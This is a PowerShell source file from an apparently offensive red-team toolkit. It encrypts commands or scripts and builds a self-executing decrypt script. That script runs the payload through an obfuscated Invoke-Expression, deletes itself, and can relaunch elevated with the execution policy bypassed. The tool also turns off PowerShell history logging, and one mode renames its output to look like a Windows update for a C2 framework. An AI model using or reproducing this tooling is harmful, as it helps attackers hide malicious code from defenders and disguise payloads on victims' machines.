<#
.SYNOPSIS
   Encrypt or decrypt strings using a secretkey.
    
   Author: r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: ConvertTo-SecureString {native}
   Optional Dependencies: Decrypt-String.ps1
   PS cmdlet Dev version: v1.0.14
   
.DESCRIPTION
   This cmdlet allow users to encrypt text\commands\scripts.ps1 with the help
   of ConvertTo-SecureString cmdlet and a secretkey of 113 bytes length, it
   outputs results on console,logfile or builds a decrypt.ps1 script with the
   decrypt function routine to be abble to execute the encrypted string ..

.NOTES
   If invoked -RandomByte '0' then cmdlet random generates SecretKey last byte.
   But in that ocassion the Decrypt-String.ps1 cmdlet will not work unless the
   comrrespondent secretkey ( the same secretkey used to encrypt ) its invoked.
   Remark: Parameter -RandomByte '253' (secretkey last byte) can be invoked on
   Decrypt-String cmdlet to input the required secretKey used by Encrypt-String
   
.Parameter Action
   Accepts arguments: console, autodecrypt, log (default: console)

.Parameter PlainTextString
   The string\text\command to encrypt (default: whoami)

.Parameter InFile
   Get the string to encrypt from txt\ps1 (default: false)

.Parameter OutFile
   The decrypt routine script name (default: decrypt)

.Parameter RandomByte
   Accepts: 0 (random), 253 (default) OR from 242 to 255

.Parameter Deldecrypt
   Auto-delete decrypt.ps1 cmdlet? (default: true)

.Parameter RunElevated
   Auto-elevate decrypt.ps1 cmdlet? (default: false)

.EXAMPLE
   PS C:\> Get-Help .\Encrypt-String.ps1 -full
   Access this cmdlet comment based help!

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "console" -plaintextstring "whoami"
   Encrypt -plaintextstring 'whoami' command and print results onscreen

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "log" -plaintextstring "whoami"
   Encrypt -plaintextstring 'whoami' command and store results on logfile

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "console" -infile "test.ps1"
   Encrypt the contents of 'test.ps1' and print results onscreen

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "autodecrypt" -plaintextstring "whoami"
   Encrypt 'whoami' command and build auto-decrypt routine function script.ps1

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "autodecrypt" -infile "test.ps1" -randombyte "248"
   Encrypt the contents of 'test.ps1' (last byte 250) + build auto-decrypt routine decrypt.ps1

.EXAMPLE
   PS C:\> .\Encrypt-String.ps1 -action "autodecrypt" -plaintextstring "powershell.exe" -runelevated "true"
   Encrypt 'powershell.exe' command + build auto-decrypt routine decrypt.ps1 that runs elevated (administrator)

.INPUTS
   None. You cannot pipe objects into Encrypt-String.ps1

.OUTPUTS
   * Powershell Ptr chiper cmdlet.

   OriginalStringChars  : 42
   SecretKeyByteLength  : 113
   ConvertedStringChars : 616
   PlainTextString      : netstat -ano|findstr ':443'|findstr /V '['
   EncryptedString      : 76492d1116743f0423413b16050a5345MgB8AHEASgBpAGoAZABlAFEATwBLAHIAbABIAHEAUwBEAG4AKwB5AG8AOQBUAEEAPQA9AHwAOAA0ADgANgBmAGYANAAzAD
                          MANgBlAGIAMAA4ADEANQBjADEANgA1ADAAYwA0AGYANAA2ADUAMgAzAGIANwAxADAANAA5ADgAMABiAGUAMABiADMAMgA3AGMAMgAzADQANQA5ADAAZgBjAGUANQA2
                          ADMAMgBmAGYAMAA4ADAANgBkADkAYwA1ADQANwA2ADAAZQA5ADEAOQAxADYAOAAyADYANgA2ADAAYwA3AGUAMQBkADAAMABjADUAMwBiADUAOAAzADEAMQBlAGQAMg
                          AxADgAYgBjADEAMQA3ADUAZgBiAGIANgAxAGEAZQA3ADAANQAwADgAMAA5ADYAZQAwAGIAYQA4AGYAZABhADkANgA2AGIAYQAxADcANQBmAGIAMAAyADYAMwBiADkA
                          MgA0ADIAOQA1ADAAMQA2AGIAOQA0ADkAOQAzAGQAMwA3ADEAZABhADgAOABmADcAZAA3ADcAMwA2AGMAMwAwADQAZgA2ADUAZABkADUAMgAwAGEA
   
.LINK
   https://github.com/r00t-3xp10it/redpill/tree/main/bypass/encrypt_decrypt/Encrypt-String.ps1
   https://github.com/r00t-3xp10it/redpill/tree/main/bypass/encrypt_decrypt/Decrypt-String.ps1
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$PlainTextString="whoami",
   [string]$RunElevated="false",
   [string]$Deldecrypt="true",
   [string]$OutFile="decrypt",
   [string]$Action="console",
   [string]$InFile="false",
   [byte]$RandomByte='253',
   [string]$Egg="false"
)


$cmdletVersion = "v1.0.14"
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@Encrypt-String $cmdletVersion {SSA@RedTeam}"
If($Egg -ieq "false")
{
   write-host "`n* Powershell Ptr chiper cmdlet." -ForegroundColor Green
}

If($RandomByte -lt 242 -or $RandomByte -gt 255)
{
   [byte]$RoolTheDiceAgain = Get-Random -Minimum 242 -Maximum 255
}
Else
{
   [byte]$RoolTheDiceAgain = [byte]$RandomByte
}

If($Action -iNotMatch '^(console|autodecrypt|log)$')
{
   write-host "*" -ForegroundColor Red -BackgroundColor Black -NoNewline;
   write-host " Error: " -ForegroundColor DarkGray -BackgroundColor Black -NoNewline;
   write-host "wrong parameter argument input .." -ForegroundColor Red -BackgroundColor Black;
   Start-Sleep -Seconds 2;Get-Help .\Encrypt-String.ps1 -Full;exit
}


## Encryption key (secretkey 113 bytes)
# NOTE: The random function generates byte keys from '242' to '255' values.
[Byte[]]$SecretKey = 117,9,103,192,133,20,53,149,82,95,108,34,82,224,226,220,56,68,133,120,139,241,176,239,171,54,231,205,83,57,51,$RoolTheDiceAgain
$DisplaySecret = "117,9,103,192,133,20,53,149,82,95,108,34,82,224,226,220,56,68,133,120,139,241,176,239,171,54,231,205,83,57,51,$RoolTheDiceAgain"
$CountBytes = [System.Text.Encoding]::UTF8.GetByteCount($SecretKey)


If($InFile -ne "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Get string to encrypt from script.ps1|.txt

   .NOTES
      This function allow attackers to encrypt the
      contents of -infile 'path\to\file' ToString()
   #>

   #Check for cmdlet dependencies!
   If(-not(Test-Path -Path "$InFile" -EA SilentlyContinue))
   {
      Write-Host "* Error: -infile '$InFile', not found.." -ForegroundColor Red -BackgroundColor Black
      Write-Host "";exit #Exit @Encrypt-String   
   }
   If($InFile -iNotMatch '(.ps1|.psm1|.psd1|.txt)$')
   {
      Write-Host "* Error: cmdlet only accepts '.ps1|.psm1|.psd1|.txt' formats." -ForegroundColor Red -BackgroundColor Black
      Write-Host "";exit #Exit @Encrypt-String 
   }

   #Get the cmdline\string to convert to string from script.ps1!
   [string]$PlainTextString = [System.IO.File]::ReadAllText("$InFile")

}


If($Action -ieq "console")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Encrypt string and print onscreen.
   #>

   Try{
      $secureString = Convertto-SecureString $PlainTextString -AsPlainText -Force
      $EncryptedString = ConvertFrom-SecureString -SecureString $secureString -Key $SecretKey
   }
   Catch{Throw $_}

   #Count how man chars does the 'original string' have!
   $Countlines = ($PlainTextString|measure -character).Characters.ToString()

   #Count how many chars exist in encryption string!
   $Chars = ($EncryptedString|measure -character).Characters.ToString()

}
ElseIf($Action -ieq "log")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Encrypt string + store results in logfile.
   #>

   Try{
      $secureString = Convertto-SecureString $PlainTextString -AsPlainText -Force
      $EncryptedString = ConvertFrom-SecureString -SecureString $secureString -Key $SecretKey
   }
   Catch{Throw $_}

   #Count how man chars does the 'original string' have!
   $Countlines = ($PlainTextString|measure -character).Characters.ToString()

   #Count how many chars exist in encryption string!
   $Chars = ($EncryptedString|measure -character).Characters.ToString()

   #Write logfile to the sellected directory!
   echo "$EncryptedString"|Out-File "$pwd\EncryptedString.log" -encoding ascii -force

   If($Egg -ieq "false")
   {
      write-host "*" -ForegroundColor Green -NoNewline;
      Write-Host " EncryptedString written to: '" -ForegroundColor DarkGray -NoNewline;
      Write-Host "$pwd\EncryptedString.log" -ForegroundColor Green -NoNewline;
      Write-Host "'" -ForegroundColor DarkGray;
   } 

}
ElseIf($Action -ieq "autodecrypt")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Encrypt string + Build decrypt script.ps1
   #>

   Try{
      $secureString = Convertto-SecureString $PlainTextString -AsPlainText -Force
      $EncryptedString = ConvertFrom-SecureString -SecureString $secureString -Key $SecretKey
   }
   Catch{Throw $_}

   #Count how man chars does the 'original string' have!
   $Countlines = ($PlainTextString|measure -character).Characters.ToString()

   #Count how many chars exist in encryption string!
   $Chars = ($EncryptedString|measure -character).Characters.ToString()
   $AutoDeleteCmdlet = "#Invoked deldecrypt 'false' parameter."

   If($Deldecrypt -ieq "True")
   {
      #Auto-Delete decrypt.ps1 cmdlet in the end of execution ..
      $AutoDeleteCmdlet = "Remove-Item -LiteralPath `$MyInvocation.MyCommand.Path -Force"
   }


#Decrypt function script!
$PS1DecriptRot = @("<#
.SYNOPSIS
   Author: @r00t-3xp10it
   Helper - Decrypt\Execute Ptr cipher! 
#>

[Byte[]]`$SecretKey = 117,9,103,192,133,20,53,149,82,95,108,34,82,224,226,220,56,68,133,120,139,241,176,239,171,54,231,205,83,57,51,$RoolTheDiceAgain
[String]`$EncryptedString = `"$EncryptedString`"

Try{
   `$SecureString = ConvertTo-SecureString `$EncryptedString -Key `$SecretKey
   `$bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR(`$SecureString)
   [string]`$String = [Runtime.InteropServices.Marshal]::PtrToStringAuto(`$bstr)
   [Runtime.InteropServices.Marshal]::ZeroFreeBSTR(`$bstr)

   #Execute Decrypted string
   echo `"`$String`"|&((echo `"0i0E0x`") -replace '0','')
   $AutoDeleteCmdlet
}
Catch{Throw `$_}")


   $OutFile = "$OutFile"+".ps1" -join ''
   #Write logfile to the sellected directory!
   echo "$PS1DecriptRot"|Out-File "$pwd\$OutFile" -encoding ascii -force

   If($RunElevated -ieq "True")
   {
      #Append 'auto-elevation' function to decrypt.ps1 cmdlet..
      ((Get-Content -Path "$pwd\$OutFile" -Raw) -Replace "#>","#>`n`nIf(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] `"Administrator`")){Start-Process powershell.exe `"-NoProfile -ExecutionPolicy Bypass -File ```"`$PSCommandPath```"`" -Verb RunAs;exit}")|Set-Content -Path "$pwd\$OutFile" -Force
   }

   If($Egg -ieq "True")
   {
      If(Test-Path -Path "$pwd\Update-KB5005101.ps1" -EA SilentlyContinue)
      {
         #@Meterpeter C2 internal function triggered by -egg 'true' parameter ...
         Move-Item -Path "$pwd\$OutFile" -Destination "$pwd\Update-KB5005101.ps1" -EA SilentlyContinue -Force
      }
   }
   Else
   {
      write-host "*" -ForegroundColor Green -NoNewline;
      Write-Host " Decrypt routine written to: '" -ForegroundColor DarkGray -NoNewline;
      Write-Host "$pwd\$OutFile" -ForegroundColor Green -NoNewline;
      Write-Host "'" -ForegroundColor DarkGray;

      If($EncryptedString.Length -gt 1000)
      {
         #Write logfile to the sellected directory!
         echo "$EncryptedString"|Out-File "$pwd\EncryptedString.log" -encoding ascii -force
         write-host "*" -ForegroundColor Green -NoNewline;
         Write-Host " EncryptedString written to: '" -ForegroundColor DarkGray -NoNewline;
         Write-Host "$pwd\EncryptedString.log" -ForegroundColor Green -NoNewline;
         Write-Host "'" -ForegroundColor DarkGray;
      }
   } 

}


If($Egg -ieq "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Print Output OnScreen.
   #>

   write-host ""
   write-host "OriginalStringChars  : $Countlines" -ForegroundColor white
   write-host "SecretKeyByteLength  : $CountBytes" -ForegroundColor white
   write-host "ConvertedStringChars : $Chars" -ForegroundColor white
   write-host "PlainTextString      : " -ForegroundColor white -NoNewline;
   write-host "$PlainTextString" -ForegroundColor DarkYellow;
   If($RandomByte -ne 253)
   {
      ## Print SecretKey if invoked -RandomByte 'true' parameter and
      # colorize the last byte of secretkey to be used in Decrypt-String
      [string]$ParseLastByte = $DisplaySecret.Split(',')[-1]                # Get last byte of secretkey
      [string]$ParseFirsByte = $DisplaySecret -replace "$ParseLastByte",""  # Delete last byte of secretKey
      write-host "RawSecretKey         : $ParseFirsByte" -ForegroundColor Green -NoNewline;
      write-host "$ParseLastByte" -ForegroundColor Yellow;
   }
   write-host "EncryptedString      : " -ForegroundColor white -NoNewline;
   write-host "$EncryptedString`n" -ForegroundColor DarkGray
}
